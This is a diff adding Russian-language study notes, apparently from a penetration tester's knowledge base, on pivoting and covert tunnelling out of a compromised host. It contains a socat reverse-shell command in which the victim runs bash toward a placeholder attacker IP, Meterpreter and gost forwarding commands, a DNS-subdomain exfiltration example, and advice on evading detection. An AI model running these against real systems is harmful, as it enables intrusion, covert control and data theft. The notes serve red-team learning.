@@ -1,0 +1,65 @@
+
+#cyberkillchain #mitreattack
+
+> Цель - создать надежный способ проброса трафика из локальной сети к скомпрометированному устройству
+
+Пивотинг - техника или набор техник, при котором достигается доступ к другим сетям со скомпрометированного компбютера
+
+### Инструменты проброса трафика
+
+#### Внутренние:
+- SSH
+- BASH
+- NC
+#### Внешние:
+- SOCAT
+	- socat TCP4-LISTEN:3389, fork TCP4:myhost:3389 &
+	- Reverse shell
+		- ``attacker > socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0``
+		- `victim > socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,setsid,sigint`
+- METERPRETER 
+	-  meterpreter> portfwd add -l 3389 -p 3389 -r (my_host)
+- GOST Proxy
+	- Стандартный HTTP/SOCKS5 прокси
+		- ghost -L=:8000
+	- Прокси с аутентификацией: 
+		- gost -L=admin:123456@localhost:8080
+	
+	- Прокси сервер: 
+		- `gost -L=socks://:1080`
+	- Прокси клиент: 
+		- `gost -L=:8080 -F=socks://server_ip:1080`
+		
+- DNS-tunneling - использование поддоменов
+	- 1 способ: `OVUWIPJRGAYDCKDSMVTXK3DBOIUSAZ3JMQ6TSOJZFBZGKZ3VNRQXEKI.example.com`
+			В имени поддомена закодирована строка: `uid=1001(regular) gid=999(regular)`
+	- 2 способ: Использование поля `opcode`?
+	Tools:
+	- `DNSCAT2` - позволяет создать С2 канал через протокол DNS
+	- `lodine` - позволяет тунеллировать данные IPv4 через DNS сервер, даже когда доступ к интернету ограничен
+
+- ICPM-tunneling - используется туннель для передачи IP-пакетов через протокол ICMP
+	Tools: `Hans` - использует туннелирование через эхо-пакеты ICMP, полезен, когда доступа в интернет нет, а ping разрешен
+### Скрытие трафика
+
+Существуют протоколы, которые не скрывают трафик, соответсвенно являются не предпочтительными: TCP/UDP, HTTPS, SSH, VPN
+
+Протоколы использующие скрытие (предпочтительнее): DNS, ICMP, HTTPS (легитимные запросы)
+
+**НЕОБХОДИМО ШИФРОВАНИЕ ТРАФИКА**
+
+### Проблемы проброса трафика
+
+1) Нестабильное соединение
+2) Частое обнаружение командами реагирования
+3) Ограничение соединений между узлами
+4) Отсутствие возможности использовать протоколы < прикладного/транспортного уровня
+
+
+## Pivoting tools
+
+- [ProxyChains-NG](https://kali.tools/?p=2075)
+- [rpivot](https://github.com/klsecservices/rpivot)
+- [reGeorg](https://github.com/sensepost/reGeorg)
+-
+
